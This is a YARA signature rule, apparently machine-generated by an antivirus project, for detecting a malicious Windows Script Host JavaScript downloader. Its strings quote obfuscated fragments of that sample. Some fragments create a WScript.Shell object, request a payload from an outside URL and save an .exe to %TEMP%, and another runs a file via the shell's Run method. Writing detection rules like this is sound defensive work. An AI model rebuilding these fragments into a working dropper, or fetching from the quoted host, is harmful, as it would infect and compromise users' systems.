rule sig_20160328_6e28cbfe7f3d2552db5dffd82d1f2f2e {
  meta:
    description = "datamaliciousorder - file 20160328_6e28cbfe7f3d2552db5dffd82d1f2f2e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "85517b85b002998f2c2b007f481625ca906e8c7d4985820dc7d8d0a1c8999319"

  strings:
    $s1  = "function Fsourbxq() {return Wggvhhla[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"myZKgCHlxnzyqr0.exe\";};" fullword ascii
    $s2  = "do {WScript[Deoxx](Tjqaozirt() * 11)} while (Riolrkvcql[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Wggvhhla = function Prgys() {return WScript[Qgwvfdwgbe](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Rurmmkgi(Dftychl, Neezpgds){return Dftychl - Neezpgds;};" fullword ascii
    $s5  = "Riolrkvcql[Somdjoxyr](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s6  = "function Kjftazwjft() {return ((Clmzwjwfk == true) && (Clmzwjwfk == Ldixxnfpdx)) ? 1 : Tgajcwywp;};" fullword ascii
    $s7  = "function Utxsnpn(Vskvolw){Wggvhhla[\"Run\"](Vskvolw, Tgajcwywp, Tgajcwywp);};" fullword ascii
    $s8  = "var Ldixxnfpdx = false;" fullword ascii
    $s9  = "function Pyalhwj(){return Agdwpgan;};" fullword ascii
    $s10 = "return Rurmmkgi(Fdaqodadxo, Ltcpdh);" fullword ascii
    $s11 = " while (Homyz){" fullword ascii
    $s12 = "Clmzwjwfk = true; " fullword ascii
    $s13 = "Ldixxnfpdx = true; " fullword ascii
    $s14 = "var Clmzwjwfk = false;" fullword ascii
    $s15 = "function Tjqaozirt(){return 22;};" fullword ascii
    $s16 = "var Sjsckxsctu = false;" fullword ascii
    $s17 = "var Ktflizppzo = new this[\"Date\"]();" fullword ascii
    $s18 = "function Nrdxqc()" fullword ascii
    $s19 = "function Funuixb(Bllfwgfbvg) {var Hbcljqeb = (1, 2, 3, 4, 5, Bllfwgfbvg); return Hbcljqeb;};" fullword ascii
    $s20 = "function Onbdcqb(){return Qgwvfdwgbe;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}